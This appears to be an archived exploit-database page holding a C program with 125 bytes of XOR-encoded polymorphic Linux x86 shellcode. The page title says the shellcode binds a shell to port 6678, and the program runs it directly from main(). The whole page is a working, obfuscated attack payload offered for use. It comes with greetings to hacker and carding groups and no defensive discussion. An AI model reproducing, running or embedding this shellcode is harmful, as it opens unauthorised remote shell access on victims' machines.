<html><head><title>Linux/x86 - bind port to 6678 XOR encoded polymorphic - 125 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
Title  : bind port to 6678 XOR encoded polymorphic linux shellcode .
Name   : 125 bind port to 6678 XOR encoded polymorphic linux shellcode .
Date   : Tue Jul  6 01:52:33 WIT 2010
Author : gunslinger_ &lt;yudha.gunslinger[at]gmail.com&gt;
Web    : http://devilzc0de.org
blog   : http://gunslingerc0de.wordpress.com
tested on : linux debian
special thanks to : r0073r (inj3ct0r.com), d3hydr8 (darkc0de.com), ty miller (projectshellcode.com), jonathan salwan(shell-storm.org),
		    mywisdom (devilzc0de.org), loneferret (offensive-security.com)
greetzz to all devilzc0de, jasakom, yogyacarderlink, serverisdown, indonesianhacker and all my friend !!
*/
 
#include &lt;stdio.h&gt;
 
char shellcode[] = &quot;\xeb\x11\x5e\x31\xc9\xb1\x65\x80\x74\x0e\xff&quot;
           	   &quot;\x0a\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff&quot;
           	   &quot;\xff\xff\x3b\xca\x3b\xd1\x3b\xd8\x5a\x60\x0b&quot;
           	   &quot;\x60\x08\x83\xeb\xf4\xc9\xba\x6c\xc7\x8a\x83&quot;
           	   &quot;\xcc\x58\x62\xb1\x08\x10\x70\x83\xeb\x60\x1a&quot;
           	   &quot;\x5b\x5c\x83\xeb\xf4\xc9\xba\x6c\xc7\x8a\x58&quot;
           	   &quot;\x5c\x83\xeb\xb9\x0e\xba\x6c\xc7\x8a\x58\x58&quot;
           	   &quot;\x5c\x83\xeb\xf4\xc9\xba\x6c\xc7\x8a\x83\xc9&quot;
           	   &quot;\x3b\xc3\xba\x35\xc7\x8a\x4b\xba\x35\xc7\x8a&quot;
           	   &quot;\x4b\xba\x35\xc7\x8a\x58\x62\x25\x25\x79\x62&quot;
           	   &quot;\x62\x25\x68\x63\x64\x83\xe9\x58\x59\x83\xeb&quot;
           	   &quot;\xba\x01\xc7\x8a&quot;;
 
         
int main(void)
{
    fprintf(stdout,&quot;Length: %d\n&quot;,strlen(shellcode));
    (*(void(*)()) shellcode)();
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
